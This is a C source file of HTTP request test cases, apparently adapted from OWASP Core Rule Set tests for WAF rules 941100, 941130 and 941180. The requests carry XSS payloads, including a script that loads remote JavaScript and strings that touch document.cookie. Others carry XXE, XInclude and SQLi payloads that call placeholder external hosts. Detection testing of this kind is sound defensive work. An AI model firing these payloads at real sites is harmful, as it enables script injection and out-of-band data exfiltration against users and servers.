#include "xss_attack.h"

static const test_case_t xss_cases[] = {

    /* TEST 1: XML-based XSS (from client9 article) */
    {
        "GET /get/demo/xss/xml/vuln.xml.php?input=<script+xmlns=\"http://www.w3.org/1999/xhtml\">setTimeout(\"top.frame2.location=\"javascript:(function+()+{var+x+=+document.createElement(\\\\\"script\\\\\");x.src+=+\\\\\"//sdl.me/popup.js?//\\\\\";document.childNodes\\\\[0\\\\].appendChild(x);}());\"\",1000)</script>&// HTTP/1.1\r\n"
        "Host: localhost\r\n"
        "User-Agent: OWASP CRS test agent\r\n"
        "Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n"
        "\r\n",
        EXPECT_MATCH,
        941100
    },

    /* TEST 2: XSS in XML with data URI */
    {
        "GET /get/char_test?mime=text/xml&body=%3Cx:script%20xmlns:x=%22http://www.w3.org/1999/xhtml%22%20src=%22data:,alert(1)%22%20/%3E HTTP/1.1\r\n"
        "Host: localhost\r\n"
        "User-Agent: OWASP CRS test agent\r\n"
        "Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n"
        "\r\n",
        EXPECT_MATCH,
        941100
    },

    /* TEST 3: XSS payload in User-Agent header */
    {
        "GET /get HTTP/1.1\r\n"
        "Host: localhost\r\n"
        "User-Agent: /char_test?mime=text/xml&body=%3Cx:script%20xmlns:x=%22http://www.w3.org/1999/xhtml%22%20src=%22data:,alert(1)%22%20/%3E\r\n"
        "Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n"
        "\r\n",
        EXPECT_MATCH,
        941100
    },

    /* TEST 4: Negative test - Legitimate Referer */
    {
        "GET /get HTTP/1.1\r\n"
        "Host: localhost\r\n"
        "User-Agent: OWASP CRS test agent\r\n"
        "Referer: http://www.coreruleset.org\r\n"
        "Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n"
        "\r\n",
        EXPECT_NO_MATCH,
        941100
    },

    /* TEST 5: Negative test - XSS in Referer (Should not match 941100 in this context) */
    {
        "GET /get HTTP/1.1\r\n"
        "Host: localhost\r\n"
        "User-Agent: OWASP CRS test agent\r\n"
        "Referer: /demo/xss/xml/vuln.xml.php?input=<script+xmlns=\"http://www.w3.org/1999/xhtml\">setTimeout(\"top.frame2.location=\"javascript:(function+()+{var+x+=+document.createElement(\\\\\"script\\\\\");x.src+=+\\\\\"//sdl.me/popup.js?//\\\\\";document.childNodes\\\\[0\\\\].appendChild(x);}());\"\",1000)</script>&//\r\n"
        "Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n"
        "\r\n",
        EXPECT_NO_MATCH,
        941100
    },

    /* TEST 6: POST request with XSS in body */
    {
        "POST /post HTTP/1.1\r\n"
        "Host: localhost\r\n"
        "User-Agent: OWASP CRS test agent\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Content-Length: 42\r\n"
        "\r\n"
        "foo=<xss onbeforehellfreezes%3Daler%77(1)>",
        EXPECT_MATCH,
        941100
    },

    /* TEST 1: XSS in XML via xmlns */
    {
        "GET /get/char_test?mime=text/xml&body=%3Cx:script%20xmlns:x=%22http://www.w3.org/1999/xhtml%22%20src=%22data:,alert(1)%22%20/%3E HTTP/1.1\r\n"
        "Host: localhost\r\n"
        "User-Agent: OWASP CRS test agent\r\n"
        "Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n"
        "\r\n",
        EXPECT_MATCH,
        941130
    },

    /* TEST 2: SQLi + XXE (extractvalue) payload */
    {
        "POST /post HTTP/1.1\r\n"
        "Host: localhost\r\n"
        "User-Agent: OWASP CRS test agent\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Content-Length: 215\r\n"
        "\r\n"
        "var=555-555-0199@example.com'||(select extractvalue(xmltype('<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY % lbsod SYSTEM \"http://im8vx9fw5e2ibzctphxn9vauwl2m0joncfz5nu.example'||'foo.bar/\">%lbsod;",
        EXPECT_MATCH,
        941130
    },

    /* TEST 3: xsi:schemaLocation evasion attempt */
    {
        "POST /post HTTP/1.1\r\n"
        "Host: localhost\r\n"
        "User-Agent: OWASP CRS test agent\r\n"
        "Content-Length: 194\r\n"
        "\r\n"
        "var=<aai xmlns=\"http://a.b/\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://a.b/ http://c5ipg3yqo8lcutvn8bghsptofflee424qxdq1f.examplefoo.bar/aai.xsd\">aai</aai>",
        EXPECT_MATCH,
        941130
    },

    /* TEST 5: XInclude attack */
    {
        "POST /post HTTP/1.1\r\n"
        "Host: localhost\r\n"
        "User-Agent: OWASP CRS test agent\r\n"
        "Content-Length: 143\r\n"
        "\r\n"
        "var=<acp xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include href=\"http://sgc5rj96zows5963jrrx3544qvwtnubvzomfa4.examplefoo.bar/foo\"/></acp>",
        EXPECT_MATCH,
        941130
    },

    /* TEST 17: FP Test (Negative test) - legitimate string containing XMLNS */
    {
        "POST /post/api/v1/query?q=7XMLNS HTTP/1.1\r\n"
        "Host: localhost\r\n"
        "User-Agent: OWASP CRS test agent\r\n"
        "\r\n",
        EXPECT_NO_MATCH,
        941130
    },

    /* TEST 18: Encoded newline evasion in XML */
    {
        "POST /post HTTP/1.1\r\n"
        "Host: localhost\r\n"
        "User-Agent: OWASP CRS test agent\r\n"
        "Content-Length: 196\r\n"
        "\r\n"
        "var=<chj%0Axmlns=\"http://a.b/\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://a.b/ http://1pre0sif8x51eifcs006ceddz45084w4kx7ovd.examplefoo.bar/chj.xsd\">chj</chj>",
        EXPECT_MATCH,
        941130
    },

    /* TEST 19: XXE pattern in User-Agent header */
    {
        "GET /get HTTP/1.1\r\n"
        "Host: localhost\r\n"
        "User-Agent: foo!ENTITY % bar SYSTEM\r\n"
        "Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n"
        "\r\n",
        EXPECT_MATCH,
        941130
    },

    /* TEST 20: HTML5 pattern attribute XSS */
    {
        "POST /post HTTP/1.1\r\n"
        "Host: localhost\r\n"
        "User-Agent: OWASP CRS test agent\r\n"
        "Content-Length: 31\r\n"
        "\r\n"
        "var=<input pattern=\"^a regex$\">",
        EXPECT_MATCH,
        941130
    },

    /* TEST 21: FP Test (Negative test) - 'pattern' word in conversation */
    {
        "POST /post HTTP/1.1\r\n"
        "Host: localhost\r\n"
        "User-Agent: OWASP CRS test agent\r\n"
        "Content-Length: 106\r\n"
        "\r\n"
        "var=There's a pattern in the dark background. Here's a video: <a href=\\x22https://www.youtube.com/watch?v=",
        EXPECT_NO_MATCH,
        941130
    },

    /* TEST 1: window.location in ARGS */
    {
        "POST /post/foo HTTP/1.1\r\n"
        "Host: localhost\r\n"
        "User-Agent: OWASP CRS test agent\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Content-Length: 24\r\n"
        "\r\n"
        "941180-1=window.location",
        EXPECT_MATCH,
        941180
    },

    /* TEST 2: document.cookie in ARGS_NAMES */
    {
        "POST /post/bar HTTP/1.1\r\n"
        "Host: localhost\r\n"
        "User-Agent: OWASP CRS test agent\r\n"
        "Content-Length: 24\r\n"
        "\r\n"
        "document.cookie=941180-2",
        EXPECT_MATCH,
        941180
    },

    /* TEST 3: window.location in Cookie header */
    {
        "GET /get/baz HTTP/1.1\r\n"
        "Host: localhost\r\n"
        "User-Agent: OWASP CRS test agent\r\n"
        "Cookie: window.location=941180-3\r\n"
        "\r\n",
        EXPECT_MATCH,
        941180
    },

    /* TEST 4: Negative test - arrow comment (should not match 941180) */
    {
        "POST /post/foo HTTP/1.1\r\n"
        "Host: localhost\r\n"
        "User-Agent: OWASP CRS test agent\r\n"
        "Content-Length: 12\r\n"
        "\r\n"
        "941180-4=-->",
        EXPECT_NO_MATCH,
        941180
    },

    /* TEST 5: Complex XSS with SSI attempt */
    {
        "POST /post HTTP/1.1\r\n"
        "Host: localhost\r\n"
        "User-Agent: OWASP CRS test agent\r\n"
        "Content-Length: 16\r\n"
        "\r\n"
        "var=\"-->'-->`-->",
        EXPECT_MATCH,
        941180
    },

    /* TEST 6: document.domain with special characters */
    {
        "POST /post/bar HTTP/1.1\r\n"
        "Host: localhost\r\n"
        "User-Agent: OWASP CRS test agent\r\n"
        "Content-Length: 27\r\n"
        "\r\n"
        "arg=...(document.domain)...",
        EXPECT_MATCH,
        941180
    },

    /* TEST 7: Negative test - legitimate filename without special chars */
    {
        "GET /get/javascript-manual/document.cookie HTTP/1.1\r\n"
        "Host: localhost\r\n"
        "User-Agent: OWASP CRS test agent\r\n"
        "\r\n",
        EXPECT_NO_MATCH,
        941180
    },

    /* TEST 8: document.querySelector injection */
    {
        "POST /post/bar HTTP/1.1\r\n"
        "Host: localhost\r\n"
        "User-Agent: OWASP CRS test agent\r\n"
        "Content-Length: 49\r\n"
        "\r\n"
        "foo=document.querySelector(\"p\").textContent=\"XSS\"",
        EXPECT_MATCH,
        941180
    },

    /* TEST 9: document.body.appendChild injection */
    {
        "POST /post/bar HTTP/1.1\r\n"
        "Host: localhost\r\n"
        "User-Agent: OWASP CRS test agent\r\n"
        "Content-Length: 79\r\n"
        "\r\n"
        "foo=document.body.appendChild(document.createElement(\"h1\")).textContent = \"XSS\"",
        EXPECT_MATCH,
        941180
    }

    
};

static const int xss_cases_count =
    (int)(sizeof(xss_cases)) / sizeof(xss_cases[0]);

int xss_get_count(void)
{
    return xss_cases_count;
}

const test_case_t *xss_get_case(int index)
{
    if (index < 0 || index >= xss_cases_count)
        return (const test_case_t *)0;
    return &xss_cases[index];
}
